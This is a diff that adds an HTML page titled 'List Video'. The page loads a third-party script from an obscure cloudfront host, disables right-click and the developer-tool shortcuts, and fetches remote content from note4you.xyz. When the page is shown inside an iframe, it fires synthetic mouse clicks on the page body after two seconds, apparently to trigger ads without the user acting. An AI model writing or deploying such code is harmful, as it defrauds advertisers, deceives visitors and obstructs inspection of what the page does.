@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta name="robots" content="noindex,nofollow,noarchive">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>List Video</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"> </script>
+    <script data-cfasync="false" src="//dcbbwymp1bhlf.cloudfront.net/?wbbcd=1195296"></script>
+</head>
+<body>
+  <div id= "id1">
+
+  </div>
+
+<div style="display:none;">	
+
+<script>
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function (e) {
+
+        // disable F12 key
+        if(e.keyCode == 123) {
+            return false;
+        }
+
+        // disable I key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+            return false;
+        }
+
+        // disable J key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            return false;
+        }
+
+        // disable U key
+        if(e.ctrlKey && e.keyCode == 85) {
+            return false;
+        }
+    }
+
+
+
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+
+
+
+
+</script>
+	
+
+
+
+		
+	  <script>
+
+		
+	if (isInIframe()) {
+    myClick();
+    
+
+	} else {
+	  $.get("https://note4you.xyz/content.html", function(data, status){
+        $("#id1").html(data);
+
+    })
+	}
+
+
+        </script>
+
+</div>
+
+
+  <script>
+
+function myClick() {    
+
+
+setTimeout(function() {   
+
+
+
+var simulateMouseEvent = function(element, eventName, coordX, coordY) {
+  element.dispatchEvent(new MouseEvent(eventName, {
+    view: window,
+    bubbles: true,
+    cancelable: true,
+    clientX: coordX,
+    clientY: coordY,
+    button: 0
+  }));
+};
+
+var theButton = document.querySelector('body');
+
+var box = theButton.getBoundingClientRect(),
+        coordX = box.left + (box.right - box.left) / 2,
+        coordY = box.top + (box.bottom - box.top) / 2;
+
+simulateMouseEvent (theButton, "mousedown", coordX, coordY);
+simulateMouseEvent (theButton, "mouseup", coordX, coordY);
+simulateMouseEvent (theButton, "click", coordX, coordY);
+
+	  
+        }, 2000)
+     
+
+}
+
+//myClick();
+</script>
+
+
+</body>
+</html>
